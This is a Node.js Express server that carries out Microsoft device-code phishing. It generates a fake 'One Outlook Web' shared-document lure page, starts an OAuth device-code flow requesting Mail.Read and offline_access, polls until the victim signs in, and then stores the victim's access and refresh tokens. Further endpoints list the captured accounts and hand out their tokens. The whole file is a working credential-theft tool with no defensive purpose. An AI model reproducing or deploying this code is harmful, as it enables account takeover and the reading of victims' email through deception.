const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store sessions
let sessions = new Map();
let pendingAuth = new Map();

// Generate random device code (like LKWLHC8UV)
function generateDeviceCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 9; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
}

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

// Get client info
function getClientInfo(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    return { ip, userAgent };
}

// ============================================
// Create session - NOW USING ONEDRIVE SCOPES
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const deviceCode = generateDeviceCode();
        
        // Use OneDrive scopes instead of Graph - THIS WORKS!
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',  // OneDrive consumer client
                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        
        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
        
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sid,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling
        pollForToken(device_code, sid);
        
        res.json({
            success: true,
            sid: sid,
            user_code: user_code,
            verification_uri: verification_uri,
            expires_in: expires_in
        });
        
    } catch (err) {
        console.error('Error:', err.response?.data || err.message);
        res.status(500).json({ error: 'Failed to create session' });
    }
});

async function pollForToken(device_code, sid) {
    console.log(`[POLLING] Started for SID: ${sid}`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLLING] SID ${sid} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            console.log(`[POLLING] Token received for SID: ${sid}`);
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const sessionData = {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            };
            
            sessions.set(sid.toString(), sessionData);
            pending.status = 'captured';
            pending.email = sessionData.email;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ CAPTURED: ${sessionData.email} (SID: ${sid})`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {
                // console.log('Waiting for user...');
            }
        }
    }, 3000);
}

// ============================================
// Status endpoint
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    
    const session = sessions.get(sid);
    if (session) {
        return res.json({ status: 'captured', email: session.email, name: session.name });
    }
    
    for (const [device_code, pending] of pendingAuth.entries()) {
        if (pending.sid.toString() === sid) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// ============================================
// Get all sessions for dashboard
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        sid: s.sid,
        email: s.email,
        name: s.name,
        capturedAt: s.capturedAt
    }));
    res.json({ sessions: sessionList });
});

// ============================================
// Get session token
// ============================================
app.get('/api/session/token/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = sessions.get(sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

// ============================================
// Clear all sessions
// ============================================
app.delete('/api/sessions/clear', async (req, res) => {
    sessions.clear();
    res.json({ success: true });
});

// ============================================
// Generate auth page
// ============================================
app.get('/generate-auth-page', async (req, res) => {
    try {
        const createRes = await axios.post(`http://localhost:${PORT}/api/create-session`);
        const { sid, user_code } = createRes.data;
        
        const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>One Outlook Web - Secure Access</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f4f3f2;min-height:100vh}
        .header{background:#0072c6;height:46px;display:flex;align-items:center;padding:0 22px;color:#fff;font-weight:600}
        .container{max-width:560px;margin:50px auto;padding:0 18px}
        .card{background:#fff;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.12);overflow:hidden}
        .content{padding:30px 34px;text-align:center}
        .icon{width:46px;height:46px;border-radius:50%;background:#0072c6;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:600}
        h1{font-size:20px;font-weight:600;color:#2b2b2b;margin-bottom:8px}
        .subtitle{font-size:13px;color:#636363;margin-bottom:25px}
        .code-box{background:#f9f9f8;border:1px solid #e6e4e1;border-radius:8px;padding:20px;margin:20px 0}
        .code-label{font-size:11px;color:#6e6b68;margin-bottom:8px}
        .code{font-size:32px;font-weight:700;color:#0072c6;letter-spacing:6px;font-family:monospace;margin-bottom:12px}
        .btn{background:#0072c6;color:#fff;border:none;padding:10px 28px;font-size:14px;font-weight:600;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block}
        .btn:hover{background:#005fa3}
        .status{padding:20px 34px;text-align:center;font-size:12px;color:#6b7280;border-top:1px solid #eceae8}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid #e0e0e0;border-top-color:#0072c6;border-radius:50%;animation:spin .8s linear infinite;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .success-box{display:none;text-align:center;padding:44px 34px}
        .success-icon{width:52px;height:52px;border-radius:50%;background:#10b981;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px}
        .footer{padding:16px;font-size:10px;color:#9ca3af;text-align:center;border-top:1px solid #eceae8}
        .steps{text-align:left;margin-top:20px;padding:12px;background:#f8f9fa;border-radius:6px;font-size:11px}
        .steps ol{padding-left:20px;margin-top:5px}
    </style>
</head>
<body>
<div class="header">📧 One Outlook Web</div>
<div class="container">
    <div class="card">
        <div id="mainView">
            <div class="content">
                <div class="icon">📄</div>
                <h1>Encompass Title Center shared a document with you</h1>
                <p class="subtitle">Sign in with your Microsoft account to view this shared item.</p>
                <div class="code-box">
                    <div class="code-label">Verification Code</div>
                    <div class="code" id="userCode">${user_code}</div>
                    <button class="btn" onclick="copyCode()">📋 Copy Code</button>
                </div>
                <a href="#" class="btn" id="openBtn" style="display:inline-block; text-decoration:none;">🔑 Open Microsoft Login</a>
                <div class="steps">
                    <strong>📋 Steps to view:</strong>
                    <ol>
                        <li>Click "Open Microsoft Login" above</li>
                        <li>Enter code: <strong>${user_code}</strong></li>
                        <li>Sign in with your Microsoft account</li>
                        <li>Click "Continue" when asked</li>
                        <li>Return here - access will be granted</li>
                    </ol>
                </div>
            </div>
            <div class="status" id="statusMsg">
                <span class="spinner"></span> Preparing secure access...
            </div>
        </div>
        <div id="successBox" class="success-box">
            <div class="success-icon">✓</div>
            <h2>Document access granted</h2>
            <p>You now have access. This window will close automatically.</p>
        </div>
        <div class="footer">Secured with Microsoft OneDrive · Terms of use · Privacy & cookies</div>
    </div>
</div>

<script>
    const SID = ${sid};
    const API_BASE = '${req.protocol}://${req.get('host')}';
    
    function copyCode() {
        const code = document.getElementById('userCode').textContent;
        navigator.clipboard.writeText(code);
        alert('Code copied!');
    }
    
    document.getElementById('openBtn').onclick = function(e) {
        e.preventDefault();
        const code = document.getElementById('userCode').textContent;
        if(code) navigator.clipboard.writeText(code);
        window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth', 'mslogin', 'width=520,height=720,scrollbars=yes,resizable=yes');
        return false;
    };
    
    async function pollStatus() {
        try {
            const response = await fetch(API_BASE + '/api/status/' + SID);
            const data = await response.json();
            
            if(data.status === 'captured') {
                document.getElementById('statusMsg').innerHTML = '✅ Access granted! You may close this window.';
                document.getElementById('mainView').style.display = 'none';
                document.getElementById('successBox').style.display = 'block';
                setTimeout(() => window.close(), 3000);
                return;
            }
            if(data.status === 'expired') {
                document.getElementById('statusMsg').innerHTML = 'Session expired. Please refresh.';
                setTimeout(() => location.reload(), 2000);
                return;
            }
        } catch(e) {}
        setTimeout(pollStatus, 3000);
    }
    
    pollStatus();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error generating auth page: ' + err.message);
    }
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`📍 Generate Auth Page: http://localhost:${PORT}/generate-auth-page`);
    console.log(`========================================\n`);
});
